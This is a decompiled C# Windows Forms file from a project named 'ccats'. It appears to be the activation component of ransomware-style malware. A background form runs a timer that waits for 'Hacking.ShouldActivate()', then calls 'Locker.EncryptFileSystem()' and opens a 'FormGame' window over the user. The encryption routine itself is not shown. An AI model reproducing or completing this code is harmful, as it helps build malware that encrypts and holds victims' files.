using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using ccats.Tools;

namespace ccats;

public class FormBackground : Form
{
	private IContainer components;

	private Timer timerActivateChecker;

	public FormBackground()
	{
		InitializeComponent();
		timerActivateChecker.set_Interval(Config.TimerActivateCheckerInterval);
		timerActivateChecker.set_Enabled(true);
	}

	private void timerActivateChecker_Tick(object sender, EventArgs e)
	{
		if (!Config.Activated && Hacking.ShouldActivate())
		{
			Config.Activated = true;
			ImposeRestrictions();
			((Form)new FormGame()).Show((IWin32Window)(object)this);
		}
	}

	private static void ImposeRestrictions()
	{
		Locker.EncryptFileSystem();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		timerActivateChecker = new Timer(components);
		((Control)this).SuspendLayout();
		timerActivateChecker.set_Enabled(true);
		timerActivateChecker.add_Tick((EventHandler)timerActivateChecker_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("FormBackground");
		((Control)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
